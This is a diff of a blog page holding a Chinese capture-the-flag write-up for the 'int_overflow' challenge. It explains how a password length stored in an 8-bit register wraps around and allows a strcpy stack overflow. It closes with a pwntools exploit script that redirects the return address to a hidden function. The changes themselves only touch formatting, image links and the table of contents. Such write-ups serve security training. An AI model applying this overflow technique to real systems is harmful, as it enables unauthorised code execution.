@@ -221,35 +221,31 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <p>攻防世界 新手区  整数溢出</p>
-<p>0x00 函数分析</p>
-<p>基本信息</p>
+            <h2 id="攻防世界-新手区-整数溢出"><a href="#攻防世界-新手区-整数溢出" class="headerlink" title="攻防世界 新手区  整数溢出"></a>攻防世界 新手区  整数溢出</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>32位，开启NX保护</p>
 <p>载入IDA，诶，看到了一个</p>
 <figure class="image-box">
-                <a rel="攻防世界,int_overflow" href="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964727164.png" title="1585964727164" data-fancybox="images"><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964727164.png" alt="1585964727164" title class></a>
+                <a rel="攻防世界,int_overflow" href="https://wx1.sbimg.cn/2020/04/20/1585964727164.png" title="1585964727164" data-fancybox="images"><img src="https://wx1.sbimg.cn/2020/04/20/1585964727164.png" alt="1585964727164" title class></a>
                 <p>1585964727164</p>
             </figure>
 <p>看来不用自己去构造了，看看怎么调用就可以了。</p>
 <p>继续分析，发现了重要得函数check_passwd，进入</p>
 <figure class="image-box">
-                <a rel="攻防世界,int_overflow" href="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964928961.png" title="1585964928961" data-fancybox="images"><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964928961.png" alt="1585964928961" title class></a>
+                <a rel="攻防世界,int_overflow" href="https://wx1.sbimg.cn/2020/04/20/1585964928961.png" title="1585964928961" data-fancybox="images"><img src="https://wx1.sbimg.cn/2020/04/20/1585964928961.png" alt="1585964928961" title class></a>
                 <p>1585964928961</p>
             </figure>
 <p>条件满足v3&gt;3u且v3&lt;8u时，可以进入下面的else中，在strcpy处有存在溢出</p>
-<p>0x01 漏洞利用</p>
-<p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
 <p>而在限制passwd长度，即v3时，汇编代码中为s</p>
 <figure class="image-box">
-                <a rel="攻防世界,int_overflow" href="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585966010822.png" title="1585966010822" data-fancybox="images"><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585966010822.png" alt="1585966010822" title class></a>
+                <a rel="攻防世界,int_overflow" href="https://wx2.sbimg.cn/2020/04/20/1585966010822.png" title="1585966010822" data-fancybox="images"><img src="https://wx2.sbimg.cn/2020/04/20/1585966010822.png" alt="1585966010822" title class></a>
                 <p>1585966010822</p>
             </figure>
 <p>在检测s的长度之后，可以看到程序把s放到一个al寄存器中，al是一个八位寄存器，八位寄存器对于无符号整数来说范围是有0~255，所以利用整数溢出，则passwd得长度应为259~264。</p>
 <p>第一种passwd太短，无法利用进行改写程序流，所以使用第二种思路。</p>
 <p>程序中存在，可以将返回地址指向what_is_this()</p>
-<p>0x02 exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=<span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=<span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
         </div>
         
@@ -257,7 +253,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-04-18T07:45:08.085Z" itemprop="dateUpdated">2020-04-18 15:45:08</time>
+    Last updated: <time datetime="2020-04-20T13:37:12.631Z" itemprop="dateUpdated">2020-04-20 21:37:12</time>
 </span><br>
 
 
@@ -330,6 +326,14 @@
 
 
     
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#攻防世界-新手区-整数溢出"><span class="post-toc-number">1.</span> <span class="post-toc-text">攻防世界 新手区  整数溢出</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x00-函数分析"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">0x00 函数分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-漏洞利用"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">0x01 漏洞利用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-exp"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">0x02 exp</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
     
 </article>
 
